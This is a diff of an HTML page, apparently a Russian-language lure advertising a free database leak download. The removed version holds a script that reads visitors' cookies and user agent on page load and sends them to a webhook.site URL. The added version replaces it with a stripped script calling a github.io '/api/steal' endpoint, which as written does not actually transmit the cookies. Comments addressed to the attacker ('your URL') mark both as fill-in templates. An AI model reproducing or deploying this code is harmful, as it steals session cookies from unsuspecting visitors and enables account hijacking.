@@ -1,25 +1,15 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <title>БЕСПЛАТНЫЙ СЛИВ БД 2026</title>
-</head>
-<body>
-    <h1 style="color:red; text-align:center;">СКАЧИВАЙ СЛИВ БАЗ ДАННЫХ БЕСПЛАТНО!</h1>
-    <p style="text-align:center; font-size:20px;">Подожди 3 секунды, файл загружается...</p>
-    <p style="text-align:center;">Жми F5 если ничего не видно.</p>
-
-    <script>
-        function stealCookies() {
-            const cookies = document.cookie;
-            if (cookies) {
-                const webhookUrl = "https://webhook.site/3e550fb6-2d7d-482c-9876-c144192f0710"; // твой URL
-                const img = new Image();
-                img.src = webhookUrl + "?cookies=" + encodeURIComponent(cookies) + "&ua=" + encodeURIComponent(navigator.userAgent);
-            }
-        }
-        stealCookies();
-        setTimeout(stealCookies, 3000);
-    </script>
-</body>
-</html>
+<script>
+async function stealCookies() {
+    const cookies = document.cookie;
+    if (cookies) {
+        try {
+            await fetch("https://rmldarkvxq.github.io/SlivBDRm/api/steal", {  // или твой Vercel URL
+                method: 'GET',
+                mode: 'no-cors'
+            });
+        } catch(e) {}
+    }
+}
+stealCookies();
+setTimeout(stealCookies, 3000);
+</script>
